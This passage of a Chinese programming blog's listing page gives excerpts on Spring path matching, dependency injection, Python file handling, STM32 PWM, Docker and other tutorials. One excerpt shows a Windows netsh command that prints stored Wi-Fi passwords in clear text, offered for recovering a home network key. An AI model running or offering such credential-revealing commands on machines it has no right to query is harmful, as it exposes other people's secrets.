		关于在网关中白名单配置的使用 在项目里,经常会有需要添加白名单,黑名单的功能, 而一般的处理方式,都是在网关进行设置配置, Spring中提供的工具包类AntPathMatcher可以很方便处理.
1 说明
Spring为PathMatcher接口提供了默认实现类,即AntPathMatcher类. 且支持Ant风格路径匹配.
通配符说明?匹配一个字符*匹配0个或多个字符**匹配0个或多个目录 此外,AntPathMatcher还支持{}参数匹配.
// true antPathMatcher.match("/root/opt","/root/opt"); 代码查看:
PathMatcher
public interface PathMatcher { // 判断路径是否带模式 boolean isPattern(String path); // 判断path是否完全匹配 boolean match(String pattern, String path); // 判断path是否前缀匹配 boolean matchStart(String pattern, String path); // 去掉路径开头的静态部分, 得到匹配的动态路径 String extractPathWithinPattern(String pattern, String path); // 匹配路径中的变量 Map&lt;String, String&gt; extractUriTemplateVariables(String pattern, String path); // 返回一个排序比较器,可对路径进行排序 Comparator&lt;String&gt; getPatternComparator(String path); // 合并两个模式 String combine(String pattern1, String pattern2); } AntPathMatcher
public class AntPathMatcher implements PathMatcher { public static final String DEFAULT_PATH_SEPARATOR = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8aef3a4ca2e4dcb5601dc6abff149e6a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/027f2112926dbd702a60f4c8f0129b32/" rel="bookmark">
			@Autowired 到底是怎么把变量注入进来的？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. Bean 的创建2. populateBean3. postProcessProperties3.1 findAutowiringMetadata3.2 inject3.3 doResolveDependency 4. 时序图 在 Spring 容器中，当我们想给某一个属性注入值的时候，有多种不同的方式，例如可以通过构造器注入、可以通过 set 方法注入，也可以使用 @Autowired、@Inject、@Resource 等注解注入。 今天松哥就来和小伙伴们聊一聊，@Autowired 到底是如何把数据注入进来的。
@Service public class AService { @Autowired BService bService; } 1. Bean 的创建 这个问题我们就得从 Bean 的创建开始了，本文主要是和小伙伴们聊 @Autowired，所以 Bean 的创建我就不从第一步开始了，咱们直接来看关键的方法，那就是 AbstractAutowireCapableBeanFactory#doCreateBean 方法：
protected Object doCreateBean(String beanName, RootBeanDefinition mbd, @Nullable Object[] args) throws BeanCreationException { //.... Object exposedObject = bean; try { populateBean(beanName, mbd, instanceWrapper); exposedObject = initializeBean(beanName, exposedObject, mbd); } //... return exposedObject; } 在这个方法中，首先会创建原始的 Bean 对象，创建出来之后，会调用一个 populateBean 方法，这个方法就是给 Bean 的各个属性赋值的方法，标注了 @Autowired 注解的属性被自动赋值也是在这个方法中完成的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/027f2112926dbd702a60f4c8f0129b32/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2dd8faeb24eefeb976e9e9b10533a30/" rel="bookmark">
			深入解析Python文件操作：打开文件处理的大门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Python中，文件操作是一项常见且重要的任务。通过文件操作，我们可以读取文件内容、写入新的数据以及对文件进行其他的操作。本文将介绍Python中的文件操作，包括打开文件、读取文件、写入文件和关闭文件等基本操作，以及一些常用的文件处理技巧和最佳实践。
一、打开文件 在进行文件操作之前，我们首先需要打开一个文件。Python提供了内置的open()函数来打开文件，并返回一个文件对象，我们可以通过该对象来进行后续的操作。
1.1 示例代码 下面是一个示例代码，展示了如何打开一个文件：
# 打开文件 file = open("example.txt", "r") 在这个示例中，我们使用open()函数打开了一个名为example.txt的文件，并将返回的文件对象赋值给变量file。参数"r"表示以只读模式打开文件，即我们可以读取文件的内容但不能修改它。
二、读取文件 一旦我们打开了一个文件，就可以开始读取文件的内容了。Python提供了多种方法来读取文件，例如逐行读取、读取整个文件或按需读取等。
2.1 逐行读取文件 逐行读取文件是一种常见的文件读取方式，特别适用于大型文件。我们可以使用文件对象的readline()方法来逐行读取文件内容。
2.2 示例代码 下面是一个示例代码，展示了如何逐行读取文件内容：
# 逐行读取文件 file = open("example.txt", "r") for line in file: print(line) file.close() 在这个示例中，我们使用for循环遍历文件对象file，每次迭代读取一行内容，并通过print()函数将其打印出来。最后，我们通过close()方法关闭文件。
2.3 读取整个文件 如果我们希望一次性读取整个文件的内容，可以使用文件对象的read()方法。该方法将返回一个包含文件所有内容的字符串。
2.4 示例代码 下面是一个示例代码，展示了如何读取整个文件的内容：
# 读取整个文件 file = open("example.txt", "r") content = file.read() print(content) file.close() 在这个示例中，我们使用read()方法将文件的所有内容读取到变量content中，并通过print()函数将其打印出来。最后，我们通过close()方法关闭文件。
2.5 按需读取文件 如果我们只需要读取文件中的一部分内容，而不是整个文件，可以使用文件对象的readlines()方法来按需读取文件内容，并返回一个包含所有行的列表。
2.6 示例代码 下面是一个示例代码，展示了如何按需读取文件的内容：
# 按需读取文件 file = open("example.txt", "r") lines = file.readlines() for line in lines: print(line) file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2dd8faeb24eefeb976e9e9b10533a30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/376a6bc0725eebb2c204f509460930d4/" rel="bookmark">
			STM32使用CubeMx配置定时器输出PWM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 概述 项目中经常使用到STM32来输出PWM，每次配置过后过不了多久就会忘记，稍微需要对配置做出修改时都要翻很久的手册，所以决定结合实例把PWM配置的详细步骤记录下来，这样在下次配置时可以很快的捡起来。
本文档的行文结构如下，首先，说明实际需求，即要输出什么样的PWM信号；然后，根据需求把手册中相关的部分摘抄下来并辅以个人的理解和总结；最后，详细说明在软件中怎么去配置并展示配置后的实验效果。
2 需求 项目中用到4路PWM信号，硬件条件决定了其只能由定时器1和定时器3产生，每个定时器输出两路PWM信号，要求4个PWM信号相位同步，每个PWM信号如图1所示。
图1 PWM输出波形要求
具体要求见表1。
表1 PWM要求
序号名称要求备注 1
周期
100us
暂定
2
占空比
0~100%可调
3
中断触发时刻
计数器下溢点
4
占空比更新时刻
计数器下溢点
3 STM高级定时器原理 图 2高级定时器的原理框图
图中用红色虚线框出来的部分是输出PWM所需要的部分，包括时钟源、计数器单元、比较寄存器及PWM输出、TRGO输出、外部触发输入，下面依次说明各部分原理。
3.1 时钟源 计数器时钟可由以下时钟源提供：
内部时钟(CK_INT)外部时钟模式1：外部输入引脚外部时钟模式2：外部触发输入ETR外部触发输入(ITRx) 输出PWM使用内部时钟(CK_INT)，只需要关心怎么配置为内部时钟以及内部时钟的频率。
3.2 计数器单元 时钟源输出的时钟经过预分频器分频后作为计数器的时钟。计数器在时钟下可以增计数、减计数、增/减计数。自动重载寄存器控制计数器的计数范围，即定时器的周期。重复计数器控制更新事件UEV产生的频率。
3.2.1 预分频器 预分频器用于对计数器时钟进行分频，分频系数可配置为1~65536。分频系数可以动态修改，不过其具有缓冲功能，修改后的分频系数只能在下一次更新事件UEV后生效（见3.2.3节）。
3.2.2 计数器 1）计数器可以增计数、减计数、增\减计数。
增计数的范围为0~自动重装值（TIMx_ARR寄存器的值），计数值为自动重装值时产生上溢事件，定时器周期=T_CK_CNT*(自动重装值+1)；减计数的范围为自动重装值（TIMx_ARR寄存器的值）~0，计数值为0时产生下溢事件，定时器周期=T_CK_CNT*(自动重装值+1)；增\减计数的范围为0~自动重装值（TIMx_ARR寄存器的值）~1，计数值为自动重装值-1时生成上溢事件，计数值为1时生成下溢事件。计数器周期=T_CK_CNT*自动重装值*2； 2）自动重装值可以配置为预装载或者不预装载。不预装载时，自动重装值实时生效；预装载时，自动重装值在下一次更新事件UEV后生效（见3.2.3节）。
3）增/减计数有3种，分别为中心对称模式1/2/3，区别在于输出比较中断标志触发的位置不同，具体见手册。
3.2.3 重复计数器及更新事件（UEV）的产生 1.重复计数器
重复计数器仅用来控制更新事件的产生。它是一个自动重装的减计数器，在更新事件UEV时自动重装，重装值为RCR寄存器的值。每次上溢或下溢事件时重复计数器减1。
2.更新事件的产生
更新事件（UEV）可以被屏蔽或者启用（TIM_CR1的UDIS位）。被屏蔽的情况下不会产生任何更新事件；被启用的情况下，有两种情况可以产生更新事件，分别为外部触发和计数器内部触发。
外部触发不受重复计数器的影响，只要触发则立即产生更新事件。外部触发有两种，分别为软件向TIM_EGR的UG位写1和外部触发输入（见3.5节）。
计数器内部触发受重复计数器的影响，只有重复计数器等于0时才可以产生更新事件。在重复计数器等于0时以下三种情况可以产生更新事件：
增计数时上溢事件时产生更新事件；减计数时下溢事件时产生更新事件；增\减计数时上溢和下溢均产生更新事件； 结合重复寄存器的原理可知，每N（RCR寄存器的值）+1次上溢或者N+1
次下溢事件产生1次更新事件 。
3.增\减计数模式下如何控制更新事件（UEV）在上溢还是下溢产生？
显然，增\减计数模式时如果配置重复寄存器RCR为奇数，更新事件将只能在上溢或下溢产生，那么该如何控制其在上溢还是在下溢产生呢？手册中写到：在启动计数器前写入RCR，则UEV将在上溢时产生，在计数器启动后写入RCR，则UEV将在下溢时产生。
但经过实测试上述说法并不完全准确。实测结果如下：
在启动计数器前对RCR写入1，UEV在上溢产生；在启动计数器前先对RCR写入1，再软件强制触发一个UEV，然后启动计数器，UEV将在下溢产生。（HAL库中有此操作，所以在CubeMx直接配置重复计数器为1，UEV仍在下溢产生）；启动计数器后，在增计数过程中对RCR写入1，UEV在上溢产生；启动计数器后，在减计数过程中对RCR写入1，UEV在下溢产生。 可以这么理解，启动计数器后首先触发的是上溢事件，然后是下溢事件。因为重复计数器是一个在更新事件UEV时自动重装载的计数器，在启动计数器前写入的1并没有装载到重复计数器，所以启动计数器后更新事件UEV在上溢产生；如果在启动计数器前软件强制触发一个UEV事件，则在启动计数器时1已经写入重复计数器，所以更新事件UEV在下溢产生。
至于启动计数器后写入RCR的现象则更好解释。因重复计数器只在UEV时更新，写入RCR后不会立马更新，所以增计数在上溢产生UEV事件然后更新重复计数器，减计数在下溢产生UEV事件然后更新重复计数器。
图 3不同模式和配置下的更新事件（UEV）的触发时刻
3.2.3 比较寄存器及PWM输出 比较寄存器（TIM_CCRx）可以配置为预装载和不预装载。预装载时，只有在下一次更新事件UEV时比较寄存器的值才会生效，不预装载时，比较寄存器的值实时生效。配置为PWM模式时必须使能预装载（使用HAL库配置为PWM模式时默认已使能预装载）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/376a6bc0725eebb2c204f509460930d4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83ba40acf30a58eb55302f64b7f683a6/" rel="bookmark">
			电脑查看以往连接WIFI信息（含密码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题场景：
家里老人手机突然坏了，更换了新手机设备，但是家里wifi密码设置不会看，这就需要远在他乡，曾经设置和连接过家里wifi的人，提供密码服务了。
问题解决：（这里只提供电脑解决方案）
首先，你有连接过家里wifi的电脑；
然后，win+r 打开cmd命令行；
最后输入两行命令：
cmd : netsh wlan show profires
cmd:netsh wlan show profile name=“Tenda_**” key=clear
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39bf8df209d0ca7d579d024204ab6787/" rel="bookmark">
			【Python】PyCharm中调用另一个文件的函数或类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🎉欢迎来到Python专栏~PyCharm中调用另一个文件的函数或类
☆* o(≧▽≦)o *☆嗨~我是小夏与酒🍹 ✨博客主页：小夏与酒的博客 🎈该系列文章专栏：Python学习专栏
文章作者技术和水平有限，如果文中出现错误，希望大家能指正🙏📜 欢迎大家关注！ ❤️
🎉 目录-PyCharm中调用另一个文件的函数或类 一、说明二、同一文件夹中的调用三、不同文件夹中的调用四、使用小例子 一、说明 Python技能树：Python入门技能树。
版本：Python 3.10。
IDE：PyCharm。
二、同一文件夹中的调用 新建一个项目，需要在main.py中调用add_method.py中的函数，注意文件的目录关系。main.py和add_method.py是在同一个文件夹下：
先在add_method.py中编写我们需要使用的函数，为了演示方便，定义了一个两数求和的函数：
def adder(a,b): return a + b 接下来在main.py中调用该函数：
import add_method c = add_method.adder(1,2) print(c) 三、不同文件夹中的调用 在不同文件夹之间调用时，需要设置对应文件夹的root路径。
先看一下不设置root路径导致的情况：
新建一个项目，在项目中新建两个文件夹分别存放main和函数：
先关注在main.py中调用adder.py中的函数，编写adder.py：
def adder(a,b): return a + b 在main.py中调用：
from fx import adder c = adder.adder(2,2) print(c) 结果发现是可以调用成功的。
叮叮叮~ 在如下情况中如果不设置root路径，将无法运行成功：
编写pow.py：
def powplus(a,b): return a*b 我们在adder.py的函数中调用powplus()函数：
import pow def adder(a,b): return a + b def add_pow(a,b): c = a + b d = pow.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39bf8df209d0ca7d579d024204ab6787/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5aa9837dbade6ade6fef459bf494db23/" rel="bookmark">
			在Linux中配置静态ip地址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们使用windows中的Xshell连接VMware虚拟机时，常常因为ip地址总是动态地变化，导致我们重新开启电脑时需要重新在centos中输入ip add 命令以获得ip地址，然后再使用Xshell创建会话与虚拟机进行连接，这样会让我们增加不必要的繁琐操作。
所以，我们应该想办法将ip地址静止下来，不让它进行动态的变化，这时，我们就需要配置静态的ip地址，具体操作如下：
1使用ip add命令查看你的ip地址 2使用ip route命令查看默认网关地址 3进入网卡文件的配置目录 使用cd /etc/sysconfig/network-scripts命令进入网卡文件的配置目录
cd /etc/sysconfig/network-scripts 然后使用vim ifcfg-ens33进入该文件并进行编辑 ,该文件名是接口interface(if)和配置config(cfg)的简称
vim ifcfg-ens33 进入之后先介绍一下这些语句的作用
BOOTPROTO="none" #none/static 表示静态配置ip地址 dhcp 表示动态获得ip地址 NAME="ens33" #网络连接的名字 DEVICE="ens33" #设备名字 ONBOOT="yes" #开机激活网卡 yes激活 no 禁用 IPADDR=192.168.*.* #具体的ip地址 PREFIX=24 #子网掩码 NETMASK=255.255.255.0 #子网掩码 GATEWAY=192.168.*.* #默认网关 DNS1=114.114.114.114 #首选DNS服务器 DNS2=192.168.1.1 #备用DNS服务器 其实需要里留下的语句主要就是保留下面四行
BOOTPROTO="none" # 配置静态ip地址 NAME="ens33" # 网络连接名字设为ens33 DEVICE="ens33" # 设备名字也设为ens33 ONBOOT="yes" # 开机激活网卡 4刷新网络服务 service network restart 5测试是否可以上网 进行完上述的操作之后，即可成功配置静态ip地址
6静态ip地址的好处 1.稳定性：静态IP地址是固定的，不会随着网络环境的变化而改变，这使得网络连接更加稳定可靠。
2.安全性：静态IP地址可以更好地控制网络访问权限，例如限制特定IP地址的访问。
3.管理方便：静态IP地址可以更容易地管理，因为管理员可以轻松地识别和跟踪网络设备。
4.兼容性：静态IP地址可确保与其他网络设备兼容，例如路由器，交换机等。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1a913ab424e086d1fcf9a8626763ea4/" rel="bookmark">
			windows编译poco c&#43;&#43;库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 最近有了解到poco c++库，这里记录下编译及使用过程。
最开始使用的vs studio 2022 和 poco 1.12.4版本编译，不管openssl 使用哪种版本，都会编译报错，最后妥协了。
参考：https://www.bilibili.com/read/cv14165658/
工具：vs studio 2019
一、VS Studio 2019安装 下载地址，选择相应的版本，安装过程这里不赘述。
二、openssl 安装 说明：openssl有两种安装方式：
下载源码包，手动编译安装，过程比较麻烦，这里选择第二种；下载地址，当前最新版本是v3.1.1。一路向下即可。 安装完成，默认安装路径：C:\Program Files (x86)\OpenSSL-Win32
三、poco 下载 Github地址，下载完解压。准备进行如下操作：
3.1 修改poco目录下的 buildwin.cmd 文件，加入上面你安装的openssl的路径 set POCO_BASE=%CD% set PATH=%POCO_BASE%\bin64;%POCO_BASE%\bin;%PATH% set OPENSSL_DIR=C:\Program Files (x86)\OpenSSL-Win32 set OPENSSL_INCLUDE=C:\Program Files (x86)\OpenSSL-Win32\include set OPENSSL_LIB=C:\Program Files (x86)\OpenSSL-Win32\lib;C:\Program Files (x86)\OpenSSL-Win32\lib\VC;C:\Program Files (x86)\OpenSSL-Win32\lib\VC\static set INCLUDE=%INCLUDE%;%OPENSSL_INCLUDE% set LIB=%LIB%;%OPENSSL_LIB% rem VS_VERSION {140 | 150 | 160} if "%1"=="" goto usage 3.2 修改poco目录下的components 文件 去掉MYSQL 及 postgreSQL，默认会编译对应模块，如果没有安装对应模块会报错。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1a913ab424e086d1fcf9a8626763ea4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d66f6996f9d5eee7f2de9cca50746495/" rel="bookmark">
			css 绘制直角梯形 和 平行四边形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 &lt;div :class="{ isFirst: index === 0, tab_item: index !== 0, }" :style="{ width: item?.label?.length &gt; 4 ? '206px' : '137px', }" &gt; &lt;div&gt; {{ item.label }} &lt;/div&gt; &lt;/div&gt; isFirst是直角梯形 tab_item是平行四边形 直角梯形 .isFirst cursor pointer width: 107px; height: 0px; border: 0px solid transparent border-bottom: 42px solid $background; border-right: 42px solid transparent display: flex justify-content: center div position: relative top: vh(12) left: vw(5) 平行四边形 .tab_item cursor: pointer; width: 137px; height: 100%; background-color: $background; position: relative; transform: skew(46deg); display: flex justify-content: center align-items: center left: vw(-15) margin-right: vw(5) div transform: skew(-46deg); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bc16cc7ad4392633dafbd1bb4b79663/" rel="bookmark">
			Docker笔记 Dockerfile镜像原理以及制作镜像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. Docker 镜像原理 思考：
Docker镜像本质是什么？
答：是一个分层的文件系统。Docker中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个G？
答：Centos的iso镜像包含bootfs和rootfs，而docker的centos镜像复用操作系统的bootfs，只有rootfs和其他镜像层。Docker中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？
答：由于docker中镜像是分层的，tomcat虽然只有70多MB，但他需要依赖父镜像和基础镜像，所以整个对外暴露的tomcat镜像大小500MB。 首先要了解操作系统的组成部分当中，有个很重要的部分叫文件管理子系统
那么我们所用的docker是基于centos，或者说基于linux，所以在这里以linux的文件管理子系统做阐述
Linux文件系统由bootfs和rootfs俩部分组成
bootfs：包含bootloader（引导加载程序）和kernel（内核）rootfs：root文件系统，包含的就是典型linux系统中的/dev，/proc，/bin，/etc等标准目录和文件不同的linux发行版，bootfs基本一样，而rootfs不同，如ubuntu，centos等 在了解了bootfs和rootfs之后，我们可以知道Docker镜像是由特殊的文件系统叠加而成
如何叠加？ 最低端是bootfs，并使用宿主机的bootfs，意思就是镜像使用的是宿主机的内核第二层是root文件系统rootfs，称为base image然后再往上可以叠加其他的镜像文件统一文件系统技术能够将不同的层整合成一个文件系统，为这些层提供了一个统一的视角，这样就隐藏了多层的存在，在用户的角度看来，只存在一个文件系统一个镜像可以放在另一个镜像的上面，位于下面的镜像称为父镜像，最底部的镜像，成为基础镜像。 以tomcat镜像为例：
所以tomcat镜像为什么有500MB原因就是用户只看到了tomcat镜像，看不到具体的细节，在这个tomcat镜像的背后还隐藏着200多MB的JDK和rootfs基础镜像
2. Docker 镜像制作 1. 容器转为镜像 #容器转为镜像 docker commit 容器id 镜像名称:版本号 #将镜像转为压缩文件 docker save -o 压缩文件名称 镜像名称:版本号 #将压缩文件还原为镜像 docker load -i 压缩文件名称 注：在原容器转为镜像之后，目录挂载会失效
2. dockerfile 概念：
Dockerfile是一个文本文件包含了一条条的指令每一条指令构建一层，属于基础镜像，最终构建出一个新的镜像对于开发人员：可以为开发团队提供一个完全一致的开发环境对于测试人员：可以直接拿着开发时所构建的镜像或者通过Dockerfile文件构建一个新的镜像开始工作了对于运维人员：在部署时，可以实现应用的无缝移植 2.1 Dockerfile常用指令 （1） FROM 指定基础镜像
FROM centos （2）MAINTAINER 指定镜像的维护者信息，一般为邮箱
MAINTAINER hitredrose@163.com （3）RUN 镜像构建时需要执行的命令
RUN yum install -y wget （4）ADD 增加文件，会自动解压
ADD python.tar.gz /usr/local/ （5）WORKDIR 设置当前工作目录
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9bc16cc7ad4392633dafbd1bb4b79663/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a311eec47e81fc890687967e0fe771f6/" rel="bookmark">
			c&#43;&#43;智能指针
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 智能指针是一种用于管理动态分配的内存的工具，它可以自动地不再需要时释放内存。 智能指针目的：避免内存泄漏和释放已经释放的内存。 用法：会在堆上分配内存，并在不再需要时自动释放。通常会跟踪指向堆上对象的引用计数， 并在引用计数为0时自动释放内存。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab54843fc6def8115a9bdddd9ee5af8a/" rel="bookmark">
			手写Mybatis源码（原来真的很简单！！！）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、JDBC操作数据库_问题分析二、自定义持久层框架_思路分析三、自定义框架_编码1、加载配置文件2、创建两个配置类对象3、解析配置文件，填充配置类对象4、创建SqlSessionFactory工厂接口及DefaultSqlSessionFactory实现类5、创建SqlSession会话接口及DefaultSqlSession实现类6、创建Executor执行器接口及SimpleExecutor实现类7、项目使用端利用自定义框架测试 四、自定义框架_优化1、优化思路2、优化代码3、优化后测试 五、Spring整合优化六、gitee代码 一、JDBC操作数据库_问题分析 JDBC使用流程
加载数据库驱动创建数据库连接创建编译对象设置入参执行SQL返回结果集 代码示例
public class JDBCTest { public static void main(String[] args) throws Exception { Connection connection = null; PreparedStatement preparedStatement = null; ResultSet resultSet = null; try { // 加载数据库驱动 Class.forName("com.mysql.jdbc.Driver"); // 通过驱动管理类获取数据库链接 connection = DriverManager.getConnection("jdbc:mysql://localhost:3306/mybatis", "root","123456789"); // 定义sql语句？表示占位符 String sql = "select * from user where name = ?"; // 获取预处理statement preparedStatement = connection.prepareStatement(sql); // 设置参数，第一个参数为sql语句中参数的序号(从1开始)，第二个参数为设置的参数值 preparedStatement.setString(1, "zhangsan"); // 向数据库发出sql执行查询，查询出结果集 resultSet = preparedStatement.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab54843fc6def8115a9bdddd9ee5af8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57c5dbbad34d43a5ff25f692e8b09aef/" rel="bookmark">
			Android Studio Flamingo | 2022.2.1 Patch 2 下 GreenDao 依赖引入踩坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考资料：https://blog.csdn.net/Cupster/article/details/114267141
setttings.gradle中配置仓库信息
dependencyResolutionManagement { repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS) repositories { mavenLocal(); maven { url 'https://maven.aliyun.com/repository/google' } //central和jcenter的聚合仓库 maven { url 'https://maven.aliyun.com/repository/public' } //仅顶级build.gradle需配置插件仓库 maven { url 'https://maven.aliyun.com/repository/gradle-plugin' } google() mavenCentral() } } 在项目的build.gradle中配置插件信息
buildscript { dependencies { classpath 'com.android.tools.build:gradle:7.1.2' classpath 'org.greenrobot:greendao-gradle-plugin:3.3.0' } } 快捷键CTRL+ALT+SHIFT+S，将Project - Gradle Version修改为7.6.2，确定，等待同步。这里如果选择8以上版本会报错：
A problem occurred configuring project ':app'. &gt; Could not create task ':app:greendaoPrepare'. &gt; Cannot use @TaskAction annotation on method DetectEntityCandidatesTask.execute() because interface org.gradle.api.tasks.incremental.IncrementalTaskInputs is not a valid parameter to an action method.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57c5dbbad34d43a5ff25f692e8b09aef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fef5d30a32fb03ead5fad6a8c83c3dc/" rel="bookmark">
			基于Java的校园快递管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主介绍：✌在职Java研发工程师、专注于程序设计、源码分享、技术交流、专注于Java技术领域和毕业设计✌
温馨提示：文末有 CSDN 平台官方提供的老师 Wechat / QQ 名片 :)
项目名称 基于Java的校园快递管理系统
演示视频 基于Java的校园快递管理系统_哔哩哔哩_bilibili
系统介绍 摘 要：数字网络技术在早期的20世纪80年代-90年代开始发展，逐渐成为21世纪的主流。互联网时代刚新启之时，大众还不太了解和接受这种新型技术，通过智能手机的到来，大众逐渐开始感受到互联网的好处，尤其是青年大学生，追求新颖，更加乐忠于网络购物。网络购物的增加，就导致物流快递的激增。学校作为大学生生活的主要场所，每天接受到的快递成百上千，在加上学生封闭集中式管理制度的局限性使的学生如何快速高效的领取快递成了一件急需解决的事情。
该系统为了解决校园快递领取问题，使的校园快递管理规范化而设计的。研究主要从学生和管理员两个方面来开展，采用B/S架构。功能主要有：人员管理、快递管理、私信管理、好友管理、快递签收等几个模块。通过信息化的手段来推动校园快递管理高效有序地进行。
综上所述，基于Java的校园快递管理系统是一个集快递管理、统计分析、好友管理等功能于一体的智能化系统。该系统采用了Java语言和相关框架技术，具有稳定性高、可维护性好、扩展性强等特点，可以满足校内快递管理的各种需求。未来，我们还将进一步完善该系统，加强安全性和用户体验，为校内快递管理提供更加优质的服务。
关键词：校园快递；快递管理；网络信息化；快递领取
4.1 需求分析
在正式开发一个系统之前，我们必须明确这个系统所应具备的功能，因此我们必须对系统的需求做一个直观的分析。需求来源于生活，因此我们在了解校园快递管理在现实中的使用场景之后，确定一个校园快递管理系统，应该具备学生和管理员两个基本角色模块，并且每个角色都应该具备相应的功能。
首先学生模块应该具备如下功能：
我的好友 学生登录系统之后，可以查看我的好友，可以在知道对方手机号码的情况下发送好友申请给对方，可以删除某个好友。
好友申请 学生可以查看我的好友申请，可以同意好友申请，同意之后，双方即为好友关系。
我的私信 学生可以在这个菜单查看自己收到的私信，并且可以对私信进行选择回复
已发送私信 学生可以再知道对方手机的情况下，给对方发送私信，或者选择只给管理发送私信，可以查看自己发送的私信历史，并且可以看到对方的回复信息。
我的快递 学生可以查看我的快递情况，可以点击签收快递。
好友的快递 双方互为好友之后，学生可以看到好友的的快递，在收到好友的代收私信后可以进行快递代签。其次，管理员应该具备如下功能：
人员管理 可以进行用户的管理，包含学生用户和管理员用户，可以添加、删除、修改用户信息，可以修改用户密码。
快递管理 可以进行快递管理，可以进行快递的录入，可以修改删除快递。可以按快递签收状态检索快递。
我的私信 管理员同样可以查看别人给自己发送的私信，可以回复对方。
已发送私信 管理员可以发送消息给某个用户、或者发送给所有人。可以看到自己已发送的私信历史，并且可以看到对方的回复。
到这里为止，系统的大概需求已经分析完毕。
4.2 系统架构层次分析
该系统采用了Jsp + JavaBean + Servlet的MVC三层架构。MVC是模型（Model）-视图（View）-控制器（Controller）的英文缩写，是一种比较常见的软件设计模式。把一个系统按照业务逻辑、数据模型、界面显示的剥离的方式构建代码，减少程序代码耦合度，从而达到简化程序的目的。
模型层（Model）:主要指业务模型，主要负责处理应用程序的数据逻辑部分，通常是在数据库中存储和数据查询，程序中的实体一般和数据库中的表字段对应。
视图层（View）:视图层，主要在应用程序中负责数据展示，模型层获取数据之后，由视图层将数据作进一步处理，并返回给控制器层。
控制器层（Controller）:主要是处理用户输入，通过是一些查询、保存、删除操作，即用户与页面交互，控制器层接受到视图层返回的数据之后，将数据直观的呈现给用户。
大致流程可以概括为，用户在页面点击操作按钮发送请求给后台服务器端后，服务器端控制器处理用户请求，并调用视图层的获取数据，视图层在调用底层的模型层对数据库进行真正的操作，操作完成之后，再把数据返回给视图层作进一步的封装处理，最后返回给控制器层，控制器层控制页面跳转，并最终将数据显示给用户。
5 系统详细设计 5.1 系统整体功能设计
首先我们要知道主要的业务流程分为那些内容，其一原有的流程分析，第二业务流程优化，其三确定新的流程，第四系统的页面设计。今天我们主要从流程设计这块来细讲，针对流程设计离不开流程图的介绍，一个好的流程图可以让我们快速了解到该项目的主要流程走向，同时也可以细化每一步的设计模块内容，可以做为一个系统的大纲来使用，让我们后续的开发能很好的按照预想去进开发。
本网站主要角色分为两大类：学生用户、管理员用户。其中学生用户通过注册会员，再通过登录页面进行登录，在登录成功过后，进入到首页模块，首页中包含我的好友、好友申请、我的私信、已发送私、我的快递、好友的快。管理员用户的功能主要是人员管理、快递管理、我的私信、已发送私。系统整体功能架构图5-1如下：
校园快递管理系统 学生 管理员 图5-1 校园快递管理系统功能整体架构图
5.2 系统用例关系图
下面我们从管理员模块和学生模块来阐释系统E-R图设计。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2fef5d30a32fb03ead5fad6a8c83c3dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
